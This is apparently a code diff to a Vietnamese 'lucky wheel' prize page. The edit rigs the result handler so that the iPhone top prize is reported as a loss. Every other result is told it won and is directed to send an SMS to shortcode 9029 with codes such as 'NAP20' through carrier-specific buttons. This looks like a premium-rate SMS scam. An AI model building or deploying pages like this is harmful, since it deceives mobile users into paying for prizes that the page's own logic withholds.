@@ -9,8 +9,8 @@
     <style>
       .hc-luckywheel{
         position:fixed;
-        top: 50%;
-        left: 50%;
+        top: 80%;
+        left: 45%;
         margin-top: -250px;
         margin-left: -250px;
       }
@@ -79,13 +79,29 @@
               callback && callback([rand, chances]);
             },
             gotBack: function(data) {
-          
+              if(data == null){
                 Swal.fire(
-                  'Đã trúng giải',
+                  'Chương trình kết thúc',
+                  'Đã hết phần thưởng',
+                  'error'
+                )
+              } else if (data == 'Bạn đã trúng thưởng Iphone XS Pro Max'){
+                Swal.fire(
+                  'Bạn không trúng thưởng',
+                  data,
+                  'error'
+                )
+              } else{
+                Swal.fire(
+                  'Đã trúng giải. vui lòng bấm vào nút phía trên và gửi tin nhắn để hoàn thành thủ tục nhận giải',
                   data,
                   'success'
 ,                 )
+              }
+            }
+          });
         },
+        false
       );
       function randomIndex(prizes){
         if(isPercentage){
@@ -195,13 +211,13 @@ input[type="submit"]:focus {
 (https://themes.googleusercontent.com/static/fonts/opensans/v8/k3k702ZOKiLJc3WVjuplzHhCUOGz7vYGh680lGh-uXM.woff) format('woff');
 }             
      </style>
-
+<br>
+ <br>
+              <br>
 <a href="sms:9029&body= IM DHT NAP20 zeroes"><input type="submit" value="Mạng Mobifone"></a>                                                                            
 
-                                        
-<br />                                    
-<br />  
- <br />                                              
+ <br>
+             <br>
           <a href="sms:9029&body= VMG PX NAP20 zeroes"><input type="submit" value="Mạng Vinafone"></a>
   <br />                                    
  <br />         
